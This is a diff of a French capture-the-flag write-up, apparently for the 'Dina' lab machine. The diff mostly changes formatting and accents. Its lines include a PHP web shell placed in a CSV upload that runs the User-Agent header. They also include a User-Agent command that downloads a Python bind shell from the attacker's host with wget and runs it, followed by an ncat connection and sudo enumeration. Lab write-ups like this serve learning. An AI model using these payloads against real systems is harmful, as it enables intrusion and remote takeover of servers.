@@ -58,9 +58,9 @@ iloveroot
 
 Ça devrait s'avérer utile...  
 
-Justement il y a une archive *backup.zip* sous */secure/* qui semble nécessiter un mot de passe :  
+Justement, il y a une archive *backup.zip* sous */secure/* qui semble nécessiter un mot de passe :  
 
-```
+```console
 $ unzip backup.zip
 Archive:  backup.zip
    skipping: backup-cred.mp3         need PK compat. v5.1 (can do v4.6)
@@ -104,7 +104,7 @@ Après avoir essayé l'un des switchers j'ai opté pour [celui-ci](https://chrom
 
 Le fichier CSV uploadé à cette forme (il doit respecter les colonnes du phonebook) :  
 
-```
+```php
 "Name","Mobile","Email","Group Code","Tags"
 "<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>",22,,,
 ```
@@ -115,7 +115,7 @@ Ce qui permet alors l'exécution de commandes :
 
 Comme pour le précédent challenge j'ai eu recours à [tcp\_pty\_bind.py](https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_bind.py) qui s'avère bien pratique.  
 
-Mon user-agent était alors *cd /tmp; wget http://192.168.1.6:8000/tcp\_pty\_bind.py; setsid python tcp\_pty\_bind.py&*  
+Mon user-agent était alors `cd /tmp; wget http://192.168.1.6:8000/tcp_pty_bind.py; setsid python tcp_pty_bind.py&`  
 
 ```
 $ ncat 192.168.1.48 31337 -v
@@ -132,9 +132,9 @@ Sympa ce petit shell mais un peu limité. Le shell définit pour *www-data* est 
 
 Il y a un utilisateur *touhid* qui pourrait être intéressant. Quelques fichiers dans son dossier Downloads mais ils ont le même hash md5 que ceux sous la racine web :-/   
 
-A tout hasard, peut-on exécuter certaines commandes en tant que root ?   
+À tout hasard, peut-on exécuter certaines commandes en tant que root ?   
 
-```
+```console
 www-data@Dina:/tmp$ sudo -l
 Matching Defaults entries for www-data on this host:
     env_reset,
